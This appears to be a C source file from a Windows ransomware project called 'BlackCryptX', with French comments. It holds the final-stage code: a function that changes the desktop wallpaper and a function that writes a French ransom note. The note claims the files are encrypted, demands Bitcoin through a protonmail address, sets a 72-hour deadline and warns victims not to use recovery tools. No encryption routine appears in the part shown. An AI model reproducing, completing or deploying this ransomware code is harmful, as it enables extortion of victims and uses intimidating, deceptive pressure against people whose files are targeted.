#include <windows.h>
#include <stdio.h>
#include <stdio.h>
#include <time.h>

int changeBackground() {
    // 1. Obtenir le chemin absolu du répertoire courant
    char currentDir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, currentDir);
    
    // 2. Construire le chemin absolu vers l'image
    char fullImagePath[MAX_PATH];
    snprintf(fullImagePath, MAX_PATH, "%s\\bcg.bmp", currentDir);
    printf("Chemin absolu de l'image: %s\n", fullImagePath);
    
    // 3. Convertir en wchar_t pour l'API Windows
    wchar_t wImagePath[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, fullImagePath, -1, wImagePath, MAX_PATH);
    
    // 4. Vérifier que le fichier existe
    DWORD fileAttributes = GetFileAttributesW(wImagePath);
    if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
        printf("Erreur: Impossible de trouver le fichier image (code %lu)\n", GetLastError());
        return 1;
    }
    
    // 5. Changer le fond d'écran avec plus d'options
    BOOL result = SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        wImagePath,
        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
    );

    if (!result) {
        DWORD error = GetLastError();
        printf("Erreur lors du changement de fond d'écran: %lu\n", error);
        
        // Afficher des informations supplémentaires selon le code d'erreur
        if (error == ERROR_ACCESS_DENIED) {
            printf("Accès refusé. Essayez d'exécuter le programme en tant qu'administrateur.\n");
        } else if (error == ERROR_FILE_NOT_FOUND) {
            printf("Fichier non trouvé.\n");
        } else if (error == ERROR_INVALID_PARAMETER) {
            printf("Paramètre invalide.\n");
        }
        return 1;
    } 

    return 0;
}


void write_ransom_note(const char *directory) {
    char filepath[MAX_PATH];
    snprintf(filepath, MAX_PATH, "%s\\README.txt", directory);

    FILE *file = fopen(filepath, "w");
    if (!file) {
        perror("Erreur lors de la création de la note de rançon");
        return;
    }

    // Générer un identifiant aléatoire
    srand((unsigned int)time(NULL));
    int id1 = rand() % 0xFFFF;
    int id2 = rand() % 0xFFFF;
    int id3 = rand() % 0xFFFF;

    fprintf(file,
        "-------------------------------\n"
        "!!! VOS FICHIERS ONT ÉTÉ CHIFFRÉS !!!\n"
        "-------------------------------\n\n"
        "Tous vos documents, photos, bases de données et autres fichiers importants ont été chiffrés avec un algorithme fort.\n\n"
        "Nom du ransomware : BlackCryptX\n\n"
        "Identifiant de votre système : %04X-%04X-%04X\n\n"
        "Aucun outil gratuit ne peut restaurer vos fichiers. La seule façon de les récupérer est de nous payer.\n\n"
        "---\n\n"
        "Pour récupérer vos fichiers :\n\n"
        "1. Créez une adresse e-mail temporaire.\n"
        "2. Envoyez un message à blackcryptx_support@protonmail.com avec votre identifiant.\n"
        "3. Nous vous enverrons le montant à payer (en Bitcoin) et les instructions.\n\n"
        "---\n\n"
        "PREUVE : Envoyez-nous un fichier .doc ou .jpg, nous vous le déchiffrerons gratuitement.\n\n"
        "---\n\n"
        "!!! NE FAITES PAS LES ERREURS SUIVANTES !!!\n\n"
        "- NE PAS éteindre votre ordinateur.\n"
        "- NE PAS tenter de restaurer les fichiers avec un logiciel tiers (vous risquez de les perdre définitivement).\n"
        "- NE PAS modifier les fichiers chiffrés.\n\n"
        "---\n\n"
        "Vous avez 72 heures avant que la clé de déchiffrement soit supprimée définitivement.\n\n"
        "Nous sommes les seuls à pouvoir restaurer vos fichiers.\n",
        id1, id2, id3
    );

    fclose(file);
}


int finisher(char *desktopPath) {
    // Appeler la fonction pour changer le fond d'écran
    changeBackground();  
    write_ransom_note(desktopPath);
    return 0;
}